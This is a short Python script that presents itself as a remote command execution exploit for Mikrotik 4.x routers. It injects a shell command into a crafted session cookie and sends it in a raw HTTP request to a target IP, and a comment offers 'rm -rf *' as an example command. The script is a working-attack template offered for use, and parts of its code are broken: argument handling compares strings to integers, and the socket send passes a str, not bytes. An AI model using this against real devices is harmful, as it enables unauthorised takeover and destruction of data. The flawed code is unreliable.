import socket, sys

def getCookie(command):
    for i in sys.argv:
        if i > 2:
            command += " " + sys.argv[i]     # Add all other command arguments
        
    cookie = f"username=!!ADMIN; activeMenuID=maintain_settings; activeSubmenuID=device_mngt; SessionID_R3=';device_com={command}"
    
    return cookie

def exploit(host, command):
    s       =   socket.socket(socket.AF_INET, socket.SOCK_STREAM)           # Create new socket for connection
    cookie  =   getCookie(command)                                          # Generate cookie payload
    
    s.connect((host,80))                                                    # Connect to host
    s.send(f'GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\r\nConnection: keep-alive\r\nReferer: https://mikrotik.com\r\nCookie: '+cookie+'\r\n\r\n')
    
    
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('Mikrotik 4.* router RCE\tFound by Passive.\r\n',
             'Usage: {} <ip> <command>'.format(sys.argv[0]))
        
    ip_addr     =   sys.argv[1]     # The host to connect to
    command     =   sys.argv[2]     # The command to send (e.g: rm -rf *)
    
    exploit(ip_addr, command)
  
